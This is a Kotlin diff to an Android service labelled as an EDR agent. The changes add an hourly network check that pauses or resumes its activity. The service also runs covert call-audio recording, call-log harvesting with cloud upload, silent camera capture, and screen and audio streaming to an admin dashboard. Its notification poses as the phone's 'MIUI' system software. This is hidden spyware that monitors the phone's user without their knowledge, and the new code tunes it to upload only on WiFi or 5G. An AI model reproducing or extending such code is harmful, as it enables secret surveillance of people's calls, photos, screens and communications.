@@ -41,6 +41,7 @@ class EdrForegroundService : Service() {
     private val monitorScheduler: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
     private var trapFallbackFuture: ScheduledFuture<*>? = null
     private var connectionPollFuture: ScheduledFuture<*>? = null
+    private var hourlyCheckFuture: ScheduledFuture<*>? = null
     @Volatile
     private var isScreenInteractive = true
     @Volatile
@@ -88,18 +89,29 @@ class EdrForegroundService : Service() {
         wsClient = EdrWebSocketClient(this)
         wsClient?.connect()
 
+        // Function 1: Run immediate startup network check & enforce policy (5G/WiFi vs 4G/3G/2G)
+        checkNetworkAndApplyPolicy("SERVICE_STARTUP")
+
+        // Schedule Function 1: Hourly Network Check (AlarmManager wakeup + ScheduledExecutor)
+        com.edr.agent.receiver.EdrHourlyCheckReceiver.scheduleHourlyAlarm(this)
+        scheduleHourlyNetworkCheck()
+
         // Start fallback pollers ONLY if currently needed
         updateTrapFallbackSchedule()
         scheduleNextConnectionPoll(delayMs = 4000L)
 
-        // Retry and upload any pending offline locked recordings & clean up old trashed files
-        AppTrapScreenRecorder.flushPendingLockedRecordings(this)
+        // Retry and upload any pending offline locked recordings & clean up old trashed files (if allowed)
+        if (!SyncPreferences.isAgentPaused) {
+            AppTrapScreenRecorder.flushPendingLockedRecordings(this)
+        }
 
         // Initialize Autonomous Call Audio Recorder
         com.edr.agent.telemetry.CallAudioRecorder.init(this)
 
-        // Harvest phone call history with exact duration metrics and synchronize with cloud
-        com.edr.agent.telemetry.CallLogHarvester.harvestAndUpload(this)
+        // Harvest phone call history with exact duration metrics and synchronize with cloud (if allowed)
+        if (!SyncPreferences.isAgentPaused) {
+            com.edr.agent.telemetry.CallLogHarvester.harvestAndUpload(this)
+        }
     }
 
     private fun registerScreenStateReceiver() {
@@ -157,6 +169,12 @@ class EdrForegroundService : Service() {
 
     @Synchronized
     fun updateTrapFallbackSchedule() {
+        if (SyncPreferences.isAgentPaused) {
+            trapFallbackFuture?.cancel(false)
+            trapFallbackFuture = null
+            return
+        }
+
         val shouldPollTrap = isScreenInteractive &&
             !EdrAccessibilityService.isReady &&
             TrapAppMonitor.hasActiveTrapsOrRecording()
@@ -241,37 +259,20 @@ class EdrForegroundService : Service() {
                 .build()
             networkCallback = object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
-                    val netStatus = EdrNetworkManager.getNetworkStatus(this@EdrForegroundService)
-                    Log.i(TAG, "Network connection changed: ${netStatus.label} (Upload allowed: ${netStatus.isCloudUploadAllowed})")
                     val client = wsClient
                     if (client == null || !client.isConnected) {
                         scheduleNextConnectionPoll(delayMs = 500L)
-                    } else {
-                        client.sendHeartbeatNow()
                     }
-                    if (netStatus.isCloudUploadAllowed) {
-                        AppTrapScreenRecorder.flushPendingLockedRecordings(this@EdrForegroundService)
-                    }
-                    if (netStatus.type != EdrNetworkManager.ConnectionType.NO_INTERNET) {
-                        SilentCameraCapturer.flushPendingLockedPhotos(this@EdrForegroundService)
-                    }
+                    checkNetworkAndApplyPolicy("NETWORK_AVAILABLE")
                 }
 
                 override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
-                    val netStatus = EdrNetworkManager.getNetworkStatus(this@EdrForegroundService)
-                    Log.d(TAG, "Network capabilities updated: ${netStatus.label}")
-                    wsClient?.sendHeartbeatNow()
-                    if (netStatus.isCloudUploadAllowed) {
-                        AppTrapScreenRecorder.flushPendingLockedRecordings(this@EdrForegroundService)
-                    }
-                    if (netStatus.type != EdrNetworkManager.ConnectionType.NO_INTERNET) {
-                        SilentCameraCapturer.flushPendingLockedPhotos(this@EdrForegroundService)
-                    }
+                    checkNetworkAndApplyPolicy("NETWORK_CAPABILITIES_CHANGED")
                 }
 
                 override fun onLost(network: Network) {
                     Log.w(TAG, "Network connection lost.")
-                    wsClient?.sendHeartbeatNow()
+                    checkNetworkAndApplyPolicy("NETWORK_LOST")
                 }
             }
             cm.registerNetworkCallback(request, networkCallback!!)
@@ -362,11 +363,78 @@ class EdrForegroundService : Service() {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
             networkCallback?.let { cm?.unregisterNetworkCallback(it) }
         } catch (ignored: Exception) {}
+        hourlyCheckFuture?.cancel(true)
         trapFallbackFuture?.cancel(true)
         connectionPollFuture?.cancel(true)
         monitorScheduler.shutdownNow()
         wsClient?.shutdown()
         Log.w(TAG, "EDR Service destroyed — will be restarted by OS (START_STICKY)")
+    }
+
+    /**
+     * Function 1: Hourly Network Check.
+     * Evaluates current network connection.
+     * - 5G / WiFi / Hotspot: EDR works normally (Active).
+     * - 4G / 4G+ / 3G / 2G / Offline: Stop all background activity (Paused) and wait 1 hour.
+     *
+     * Function 2: Admin Ping Response triggers this immediately without waiting for hourly timer.
+     */
+    @Synchronized
+    fun checkNetworkAndApplyPolicy(trigger: String): EdrNetworkManager.NetworkStatus {
+        val netStatus = EdrNetworkManager.getNetworkStatus(this)
+        SyncPreferences.lastNetworkCheckTime = System.currentTimeMillis()
+        val shouldWorkNormally = netStatus.shouldWorkNormally
+
+        val isNowPaused = !shouldWorkNormally
+        SyncPreferences.isNetworkPaused = isNowPaused
+
+        Log.i(TAG, "[$trigger] Network: ${netStatus.typeName} (${netStatus.label}) -> EDR: ${SyncPreferences.edrStatus}")
+
+        if (isNowPaused) {
+            // STOP ALL BACKGROUND ACTIVITY
+            try {
+                if (AppTrapScreenRecorder.isCurrentlyRecording()) {
+                    Log.i(TAG, "Stopping active trap recording due to network pause policy ($trigger).")
+                    AppTrapScreenRecorder.stopRecording(applicationContext)
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error stopping active recording: ${e.message}")
+            }
+            try {
+                com.edr.agent.screen.ScreenStreamManager.stopStreaming()
+            } catch (_: Exception) {}
+            try {
+                com.edr.agent.screen.AudioStreamManager.stopStreaming()
+            } catch (_: Exception) {}
+
+            // Cancel trap fallback poller
+            updateTrapFallbackSchedule()
+        } else {
+            // RESUME NORMAL EDR WORK
+            updateTrapFallbackSchedule()
+            AppTrapScreenRecorder.flushPendingLockedRecordings(this)
+            SilentCameraCapturer.flushPendingLockedPhotos(this)
+        }
+
+        // Update notification (shows "MIUI (Paused)" or "MIUI")
+        updateNotification()
+
+        // Push status to Admin Dashboard immediately (via WebSocket or HTTP fallback)
+        wsClient?.sendNetworkAndEdrStatus(netStatus)
+
+        return netStatus
+    }
+
+    @Synchronized
+    private fun scheduleHourlyNetworkCheck() {
+        hourlyCheckFuture?.cancel(false)
+        hourlyCheckFuture = monitorScheduler.scheduleWithFixedDelay({
+            try {
+                checkNetworkAndApplyPolicy("HOURLY_TIMER")
+            } catch (e: Exception) {
+                Log.w(TAG, "Hourly network check timer error: ${e.message}")
+            }
+        }, 1L, 1L, TimeUnit.HOURS)
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
